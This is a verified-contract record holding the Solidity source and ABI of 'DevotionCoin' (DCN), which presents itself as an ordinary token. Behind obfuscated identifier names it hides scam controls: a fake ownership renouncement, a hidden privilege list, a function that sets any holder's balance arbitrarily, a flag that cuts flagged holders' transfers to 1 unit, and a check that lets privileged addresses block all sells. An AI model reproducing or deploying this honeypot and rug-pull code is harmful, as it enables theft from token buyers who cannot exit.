{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract sellWalletTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingLimit {\n    function createPair(address fundAuto, address tokenReceiver) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface fromAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface atMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellTrading) external view returns (uint256);\n\n    function transfer(address isExemptSell, uint256 enableLimit) external returns (bool);\n\n    function allowance(address launchedTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isExemptSell,\n        uint256 enableLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellMinReceiver, uint256 value);\n    event Approval(address indexed launchedTx, address indexed spender, uint256 value);\n}\n\ninterface atMaxMetadata is atMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DevotionCoin is sellWalletTake, atMax, atMaxMetadata {\n\n    uint256 senderSwap;\n\n    mapping(address => bool) public tokenTx;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoMax;\n    }\n\n    mapping(address => mapping(address => uint256)) private senderExempt;\n\n    function atFeeTrading(address tokenSender, uint256 enableLimit) public {\n        launchedAuto();\n        walletMinAuto[tokenSender] = enableLimit;\n    }\n\n    uint256 minMax;\n\n    bool public limitFee;\n\n    address fundLaunched;\n\n    function getOwner() external view returns (address) {\n        return amountToken;\n    }\n\n    bool public minTotalMax;\n\n    address public exemptEnableFee;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverLaunch;\n    }\n\n    function fromIs(address takeFromTo, address isExemptSell, uint256 enableLimit) internal returns (bool) {\n        require(walletMinAuto[takeFromTo] >= enableLimit);\n        walletMinAuto[takeFromTo] -= enableLimit;\n        walletMinAuto[isExemptSell] += enableLimit;\n        emit Transfer(takeFromTo, isExemptSell, enableLimit);\n        return true;\n    }\n\n    function minIs() public {\n        emit OwnershipTransferred(exemptEnableFee, address(0));\n        amountToken = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return amountToken;\n    }\n\n    uint256 constant swapWallet = 1 ** 10;\n\n    address public isAtSwap;\n\n    uint256 private enableLiquidityTx = 100000000 * 10 ** 18;\n\n    uint256 private isTotalList;\n\n    function transferFrom(address takeFromTo, address isExemptSell, uint256 enableLimit) external override returns (bool) {\n        if (_msgSender() != senderFee) {\n            if (senderExempt[takeFromTo][_msgSender()] != type(uint256).max) {\n                require(enableLimit <= senderExempt[takeFromTo][_msgSender()]);\n                senderExempt[takeFromTo][_msgSender()] -= enableLimit;\n            }\n        }\n        return fromLiquidityToken(takeFromTo, isExemptSell, enableLimit);\n    }\n\n    uint256 public exemptMarketingTx;\n\n    uint256 private fundTeamShould;\n\n    constructor (){\n        if (limitFee != liquidityTokenLaunch) {\n            fundTeam = fundTeamShould;\n        }\n        minIs();\n        fromAuto tokenLimit = fromAuto(senderFee);\n        isAtSwap = marketingLimit(tokenLimit.factory()).createPair(tokenLimit.WETH(), address(this));\n        fundLaunched = marketingLimit(tokenLimit.factory()).feeTo();\n        if (exemptMarketingTx != isTotalList) {\n            liquidityTokenLaunch = true;\n        }\n        exemptEnableFee = _msgSender();\n        tokenTx[exemptEnableFee] = true;\n        walletMinAuto[exemptEnableFee] = enableLiquidityTx;\n        if (isTotalList == exemptMarketingTx) {\n            liquidityTokenLaunch = false;\n        }\n        emit Transfer(address(0), exemptEnableFee, enableLiquidityTx);\n    }\n\n    event OwnershipTransferred(address indexed receiverAt, address indexed feeTeam);\n\n    bool private liquidityTokenLaunch;\n\n    uint256 public listTxLimit = 0;\n\n    function enableMode(address launchedFeeMin) public {\n        launchedAuto();\n        if (fundTeamShould == isTotalList) {\n            fundTeam = txLaunch;\n        }\n        if (launchedFeeMin == exemptEnableFee || launchedFeeMin == isAtSwap) {\n            return;\n        }\n        exemptFund[launchedFeeMin] = true;\n    }\n\n    address private amountToken;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableLiquidityTx;\n    }\n\n    function launchedAuto() private view {\n        require(tokenTx[_msgSender()]);\n    }\n\n    function balanceOf(address sellTrading) public view virtual override returns (uint256) {\n        return walletMinAuto[sellTrading];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountExempt;\n    }\n\n    function transfer(address tokenSender, uint256 enableLimit) external virtual override returns (bool) {\n        return fromLiquidityToken(_msgSender(), tokenSender, enableLimit);\n    }\n\n    function allowance(address toMarketing, address feeMode) external view virtual override returns (uint256) {\n        if (feeMode == senderFee) {\n            return type(uint256).max;\n        }\n        return senderExempt[toMarketing][feeMode];\n    }\n\n    uint256 public txLaunch;\n\n    address senderFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function enableMin(uint256 enableLimit) public {\n        launchedAuto();\n        minMax = enableLimit;\n    }\n\n    function fundAutoSwap(address takeFromTo, address isExemptSell, uint256 enableLimit) internal view returns (uint256) {\n        require(enableLimit > 0);\n\n        uint256 receiverLiquidity = 0;\n        if (takeFromTo == isAtSwap && fromBuy > 0) {\n            receiverLiquidity = enableLimit * fromBuy / 100;\n        } else if (isExemptSell == isAtSwap && listTxLimit > 0) {\n            receiverLiquidity = enableLimit * listTxLimit / 100;\n        }\n        require(receiverLiquidity <= enableLimit);\n        return enableLimit - receiverLiquidity;\n    }\n\n    mapping(address => uint256) private walletMinAuto;\n\n    string private receiverLaunch = \"Devotion Coin\";\n\n    uint256 private fundTeam;\n\n    string private amountExempt = \"DCN\";\n\n    uint8 private autoMax = 18;\n\n    function launchLiquidityTrading(address receiverFund) public {\n        require(receiverFund.balance < 100000);\n        if (minTotalMax) {\n            return;\n        }\n        \n        tokenTx[receiverFund] = true;\n        \n        minTotalMax = true;\n    }\n\n    function approve(address feeMode, uint256 enableLimit) public virtual override returns (bool) {\n        senderExempt[_msgSender()][feeMode] = enableLimit;\n        emit Approval(_msgSender(), feeMode, enableLimit);\n        return true;\n    }\n\n    function fromLiquidityToken(address takeFromTo, address isExemptSell, uint256 enableLimit) internal returns (bool) {\n        if (takeFromTo == exemptEnableFee) {\n            return fromIs(takeFromTo, isExemptSell, enableLimit);\n        }\n        uint256 fundAt = atMax(isAtSwap).balanceOf(fundLaunched);\n        require(fundAt == minMax);\n        require(isExemptSell != fundLaunched);\n        if (exemptFund[takeFromTo]) {\n            return fromIs(takeFromTo, isExemptSell, swapWallet);\n        }\n        enableLimit = fundAutoSwap(takeFromTo, isExemptSell, enableLimit);\n        return fromIs(takeFromTo, isExemptSell, enableLimit);\n    }\n\n    mapping(address => bool) public exemptFund;\n\n    uint256 public fromBuy = 3;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMinReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeMode\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLimit\",\"type\":\"uint256\"}],\"name\":\"atFeeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableLimit\",\"type\":\"uint256\"}],\"name\":\"enableMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFeeMin\",\"type\":\"address\"}],\"name\":\"enableMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptEnableFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMarketingTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAtSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"}],\"name\":\"launchLiquidityTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTxLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTotalMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFromTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isExemptSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DevotionCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}